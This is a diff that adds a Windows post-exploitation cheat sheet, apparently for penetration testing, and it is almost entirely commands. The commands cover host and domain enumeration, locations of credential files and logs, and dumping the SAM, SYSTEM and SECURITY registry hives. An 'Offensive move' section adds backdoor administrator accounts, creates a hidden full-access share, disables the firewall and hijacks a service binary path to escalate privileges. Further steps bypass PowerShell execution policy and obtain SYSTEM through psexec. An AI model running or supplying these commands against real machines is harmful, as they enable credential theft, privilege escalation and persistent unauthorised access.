@@ -1,0 +1,130 @@
+1. Determine the users, environment path, systeminfo, RDP, running process, schedule task, running services:
+	$ whoami
+	$ whoami /all
+	$ hostname
+	$ set 			# Check on the environment path
+	$ systeminfo 
+	$ qwinsta		# Check on RDP session information
+	$ qprocess *	# Same as tasklist but less messy
+	$ tasklist /FO table > tabletasklist		# Current running process
+	$ schtasks /query /FO table > schtaskstable # Schedule task list
+	$ net start		# Started services
+	$ sc getkeyname "XXXX"	# Get the keyname from net start
+	$ sc queryex "XXXX"		# Get the name from keyname
+	
+2. Determine the current network and domain users in the machine:
+	$ ipconfig /all
+	$ ipconfig /displaydns
+	$ netstat -ano		# display all network, addresses, ports and PID process
+	$ netstat -r		# network route table
+	$ net user /domain	# List all domain users
+	$ net localgroup administrators	# Local group administrators
+	$ net localgroup administrators /domain	# Local group domain administrators
+	$ net group "Domain Admins" /domain		# Domain Admin group
+	$ net group "Enterprise Admins" /domain # Enterprise Admin group
+	$ net group "Domain Controllers" /domain 	# Domain Admin group
+	$ nbtstat -a [IP]	# List the hostname of the IP
+	$ net share
+	$ arp -a
+	$ route print 
+	
+3. System configuration such as local group and group policy:
+	$ gpresult /z	# group policy results
+	$ type %WINDIR%\System32\drivers\etc\hosts
+	$ dir %PROGRAMFILES(x86)%	OR dir %programW6432%	# Note: may not have this env set
+
+4. Finding important files and weak folders permissions:
+	$ tree C:\ /f /a > file.txt		# Output the files in tree format
+	$ %windir%\repair\sam
+	$ %windir%\repair\system
+	$ %windir%\repair\software
+	$ %windir%\repair\security
+	$ %windir%\iis[5,6,7].log
+	$ %windir%\system32\logfiles\httperr\httper1.log
+	$ $windir%\system32\logfiles\w3svc1\exYYMMDD.log
+	$ %windir%\system32\config\AppEvent.Evt
+	$ %windir%\system32\config\SecEvent.Evt
+	$ %windir%\system32\config\default.sav
+	$ %windir%\system32\config\security.sav
+	$ %windir%\system32\config\software.sav
+	$ %windir%\system32\config\system.sav
+	$ %windir%\system32\CCM\logs\*.log
+	$ %userprofile%\ntuser.dat
+	$ %userprofile%\LocalS~1\Tempor~1\Content.IE5\index.dat
+	$ %windir%\system32\drivers\etc\hosts
+	
+	
+5. Remote System Access
+	$ net share \\computername
+	$ tasklist /V /S computername	# show the task remote computer and remove any IPC$ connection
+	$ qwinsta /SERVER:computername
+	$ qprocess /SERVER:computername
+	$ mstsc /v:SERVER:PORT
+	$ net use \\computername
+	$ net use \\computername /user:DOMAINNAME\username password
+	$ net time \\computername	# show the time of the computername
+	$ dir \\computername\share
+	
+6. Auto start dir:
+	$ %systemdrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
+	$ %systemdrive%\Documents and Settings\All Users\Start Menu\Programs\StartUp
+	$ %systemdrive%\Windows\Start Menu\Programs\StartUp
+	$ %systemdrive%\WINNT\Profiles\All Users\Start Menu\Programs\StartUp
+	
+7. WMIC-FU
+	$ wmic bios
+	$ wmic qfe
+	$ wmic /output:test.csv qfe get hotfixid, installedon, installdate, installedby /format:csv
+	$ wmic /output:test.csv startup get * /format:csv
+	$ wmic /output:test.csv service get caption, name, servicetype, startmode, state, processid, pathname /format:csv
+	$ wmic os get caption, csdversion, csname, osarchitecture, version
+	$ wmic /output:test.csv process get caption, executablepath, commandline, processid /format:csv|htable|table 
+	$ wmic process call create "process_name"	# execute a programW6432%
+	$ wmic process where name="process_name" call terminate		# terminate the program
+	$ wmic /output:test.csv startup list full /format:csv
+	$ wmic /output:test.csv product get caption, installdate, installlocation, packagecache, vendor, version /format:csv 
+	
+	# Get the unquoted service path
+	$ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """	
+	#### Get unquoted path and check for the folders and files cacls or icacls for write and execute privilege ####
+	
+	$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+	$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+	
+
+8. Registry command: (most of the time require Administrator)
+	$ reg save HKLM\Security security.hive
+	$ reg save HKLM\System system.hive
+	$ reg save HKLM\SAM sam.hive	
+	$ reg add [\\TargetIPaddr\][RegDomain][\Key]
+	$ reg export [RegDomain]\[Key][Filename]
+	$ reg import [Filename]
+	$ reg query [\\TargetIPaddr\][RegDomain]\[Key] /v [Valuename]
+
+9. Offensive move:
+	$ net user [username] [username] /add	# Add new user with password
+	$ net localgroup administrators /add [username]	# Add new user to local group administrator
+	$ net localgroup administrators [username] /add
+	$ net share nothing$=C:\ /grant:[username],FULL / unlimited
+	$ net user [username] /active:yes /domain
+	$ net firewall set opmode disable
+	$ net firewall set opmode enable
+	$ sc config <service name(sc getkeyname "Windows Audio")> start=auto
+	$ netsh trace start capture=yes IPv4.Address=[localIP]		# After successful got Administrator start capture pcap without install netcat
+	$ netsh trace stop											# 
+	
+	$ accesschk.exe /accepteula -uwqvc "Authenticated Users" * > auth-txt
+	$ sc config SSDPSRV binpath= "C:\Inetpub\bla.exe"
+	$ sc config SSDPSRV obj= ".\LocalSystem" password= ""
+	$ sc config SSDPSRV start= demand
+	$ net start SSDPSRV
+
+10. Powershell runas
+	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File runas.ps1
+
+11. Getting into system with pseexec
+	$ psexec.exe -i -s %SystemRoot%\system32\cmd.exe
+	
+	
+	
+	
